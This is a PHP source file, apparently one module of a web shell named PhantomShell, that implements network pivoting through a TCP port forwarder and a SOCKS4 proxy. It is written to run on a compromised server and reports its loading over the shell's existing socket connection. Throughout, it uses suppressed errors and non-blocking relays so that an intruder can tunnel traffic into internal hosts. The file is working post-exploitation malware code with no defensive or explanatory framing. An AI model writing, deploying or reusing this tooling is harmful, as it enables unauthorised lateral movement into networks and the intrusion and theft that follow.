<?php
// PhantomShell Module: Pivoting
// Load via MINIMAL mode: fetch pivoting

function mod_portfwd($lport, $rhost, $rport) {
    $srv = @stream_socket_server("tcp://0.0.0.0:$lport", $en, $es);
    if (!$srv) return false;
    stream_set_blocking($srv, false);
    $conns = array();

    while (true) {
        $cl = @stream_socket_accept($srv, 0);
        if ($cl) {
            $rm = @fsockopen($rhost, $rport, $en, $es, 5);
            if ($rm) {
                stream_set_blocking($cl, false);
                stream_set_blocking($rm, false);
                $conns[] = array($cl, $rm);
            } else {
                @fclose($cl);
            }
        }
        foreach ($conns as $k => $pr) {
            $d1 = @fread($pr[0], 4096);
            if ($d1 !== false && $d1 !== '') @fwrite($pr[1], $d1);
            $d2 = @fread($pr[1], 4096);
            if ($d2 !== false && $d2 !== '') @fwrite($pr[0], $d2);
            if (feof($pr[0]) || feof($pr[1])) {
                @fclose($pr[0]); @fclose($pr[1]);
                unset($conns[$k]);
            }
        }
        $conns = array_values($conns);
        usleep(10000);
    }
}

function mod_socks4($port) {
    $srv = @stream_socket_server("tcp://0.0.0.0:$port", $en, $es);
    if (!$srv) return false;
    stream_set_blocking($srv, false);
    $conns = array();

    while (true) {
        $cl = @stream_socket_accept($srv, 0);
        if ($cl) {
            stream_set_blocking($cl, true);
            stream_set_timeout($cl, 5);
            $hd = @fread($cl, 9);
            if (strlen($hd) >= 8 && ord($hd[0]) === 4 && ord($hd[1]) === 1) {
                $dp = (ord($hd[2]) << 8) + ord($hd[3]);
                $di = ord($hd[4]).'.'.ord($hd[5]).'.'.ord($hd[6]).'.'.ord($hd[7]);
                while (($b = @fread($cl, 1)) !== false && $b !== "\x00" && $b !== '') {}
                $rm = @fsockopen($di, $dp, $en, $es, 5);
                if ($rm) {
                    @fwrite($cl, "\x00\x5a" . substr($hd, 2, 6));
                    stream_set_blocking($cl, false);
                    stream_set_blocking($rm, false);
                    $conns[] = array($cl, $rm);
                } else {
                    @fwrite($cl, "\x00\x5b" . substr($hd, 2, 6));
                    @fclose($cl);
                }
            } else {
                @fclose($cl);
            }
        }
        foreach ($conns as $k => $pr) {
            $d1 = @fread($pr[0], 8192);
            if ($d1 !== false && $d1 !== '') @fwrite($pr[1], $d1);
            $d2 = @fread($pr[1], 8192);
            if ($d2 !== false && $d2 !== '') @fwrite($pr[0], $d2);
            if (feof($pr[0]) || feof($pr[1])) {
                @fclose($pr[0]); @fclose($pr[1]);
                unset($conns[$k]);
            }
        }
        $conns = array_values($conns);
        usleep(10000);
    }
}

if (isset($sock)) {
    @fwrite($sock, "  Pivoting module loaded.\n");
    @fwrite($sock, "  Functions: mod_portfwd(\$lport,\$rhost,\$rport), mod_socks4(\$port)\n");
}
?>
